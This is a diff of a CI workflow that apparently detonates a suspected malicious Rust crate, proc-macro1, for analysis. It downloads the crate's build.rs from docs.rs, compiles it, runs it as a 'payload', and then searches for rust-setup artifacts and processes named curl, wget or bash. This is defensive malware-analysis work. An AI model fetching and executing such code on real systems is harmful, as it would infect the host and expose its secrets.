@@ -1,4 +1,4 @@
-name: Analyze arrayref 0.3.10 / proc-macro1 1.0.107
+name: Execute proc-macro1 build.rs from docs.rs
 
 on:
   workflow_dispatch:
@@ -19,63 +19,18 @@ jobs:
       - name: Setup Rust
         uses: dtolnay/rust-toolchain@stable
 
-      - name: Create victim project
+      - name: Fetch and materialize build.rs from docs.rs
         run: |
-          mkdir -p /tmp/victim-linux/src
-          mkdir -p /tmp/victim-linux/vendor/proc-macro1/src
-          cat > /tmp/victim-linux/Cargo.toml <<'EOF'
-          [package]
-          name = "victim-arrayref-linux"
-          version = "0.1.0"
-          edition = "2021"
-
-          [dependencies]
-          arrayref = "=0.3.10"
-
-          [patch.crates-io]
-          proc-macro1 = { path = "vendor/proc-macro1" }
-          EOF
-
-          cat > /tmp/victim-linux/src/main.rs <<'EOF'
-          use arrayref::array_ref;
-
-          fn main() {
-              let bytes = [1u8, 2, 3, 4];
-              let value = array_ref![bytes, 0, 4];
-              println!("{value:?}");
-          }
-          EOF
-
-          cat > /tmp/victim-linux/vendor/proc-macro1/Cargo.toml <<'EOF'
-          [package]
-          name = "proc-macro1"
-          version = "1.0.107"
-          edition = "2021"
-          build = "build.rs"
-
-          [lib]
-          path = "src/lib.rs"
-          EOF
-
-          cat > /tmp/victim-linux/vendor/proc-macro1/src/lib.rs <<'EOF'
-          pub fn placeholder() {}
-          EOF
-
-      - name: Fetch pinned proc-macro1 build.rs from docs.rs
-        continue-on-error: true
-        run: |
-          mkdir -p /tmp/reference
-          target=/tmp/victim-linux/vendor/proc-macro1/build.rs
-          raw=/tmp/reference/proc-macro1-1.0.107-build.rs.raw
-          html=/tmp/reference/proc-macro1-1.0.107-build.rs.html
+          mkdir -p /tmp/proc-macro1
+          raw=/tmp/proc-macro1/build.rs.raw
+          target=/tmp/proc-macro1/build.rs
 
           for url in \
-            "https://docs.rs/crate/proc-macro1/1.0.107/source/build.rs?plain=1" \
-            "https://docs.rs/crate/proc-macro1/1.0.107/source/build.rs?raw=1" \
-            "https://docs.rs/crate/proc-macro1/1.0.107/source/build.rs"
+            "https://docs.rs/crate/proc-macro1/latest/source/build.rs?plain=1" \
+            "https://docs.rs/crate/proc-macro1/latest/source/build.rs?raw=1" \
+            "https://docs.rs/crate/proc-macro1/latest/source/build.rs"
           do
             if curl -fsSL "$url" -o "$raw"; then
-              cp "$raw" "$html"
               if grep -q "SRC_URL_PARTS" "$raw"; then
                 cp "$raw" "$target"
                 break
@@ -85,8 +40,8 @@ jobs:
               import html
               import re
 
-              raw_path = "/tmp/reference/proc-macro1-1.0.107-build.rs.raw"
-              target_path = "/tmp/victim-linux/vendor/proc-macro1/build.rs"
+              raw_path = "/tmp/proc-macro1/build.rs.raw"
+              target_path = "/tmp/proc-macro1/build.rs"
 
               with open(raw_path, "r", encoding="utf-8", errors="ignore") as handle:
                   data = handle.read()
@@ -108,34 +63,28 @@ jobs:
             fi
           done
 
-          if [ ! -s "$target" ]; then
-            echo "Failed to materialize proc-macro1 build.rs from docs.rs" >&2
-            exit 1
-          fi
-
+          test -s "$target"
           grep -n "SRC_URL_PARTS\\|END_URL_PARTS\\|rust-setup" "$target" || true
 
-      - name: Resolve dependency tree
+      - name: Compile build.rs
         continue-on-error: true
         run: |
-          cd /tmp/victim-linux
-          cargo tree -i proc-macro1 2>&1 || true
-          cargo tree 2>&1 || true
+          rustc /tmp/proc-macro1/build.rs -O -o /tmp/proc-macro1/build-rs-bin
+          ls -la /tmp/proc-macro1
 
-      - name: Build victim project
+      - name: Execute build.rs payload
         continue-on-error: true
         run: |
-          cd /tmp/victim-linux
-          cargo build -vv 2>&1 || true
+          /tmp/proc-macro1/build-rs-bin 2>&1 || true
 
-      - name: Check Linux payload artifacts
+      - name: Check artifacts
         if: always()
         run: |
-          echo "=== /tmp rust-setup artifacts ==="
-          find /tmp -maxdepth 2 \( -name 'rust-setup' -o -name 'rust-setup.*' -o -name 'rust-setup-launch.vbs' \) -ls || true
+          echo "=== proc-macro1 temp dir ==="
+          ls -la /tmp/proc-macro1 || true
           echo ""
-          echo "=== victim target tree ==="
-          find /tmp/victim-linux/target -maxdepth 4 -type f | sort | head -200 || true
+          echo "=== rust-setup artifacts ==="
+          find /tmp -maxdepth 2 \( -name 'rust-setup' -o -name 'rust-setup.*' -o -name 'rust-setup-launch.vbs' \) -ls || true
           echo ""
           echo "=== suspicious processes ==="
           ps aux | grep -E 'rust-setup|curl|wget|bash|sh|python|perl' | grep -v grep || echo "None"
@@ -144,12 +93,9 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: arrayref-0310-linux-artifacts
+          name: proc-macro1-buildrs-artifacts
           path: |
-            /tmp/victim-linux/Cargo.lock
-            /tmp/victim-linux/target
-            /tmp/victim-linux/vendor/proc-macro1
-            /tmp/reference/proc-macro1-1.0.107-build.rs.html
+            /tmp/proc-macro1
             /tmp/rust-setup
             /tmp/rust-setup.*
           if-no-files-found: ignore
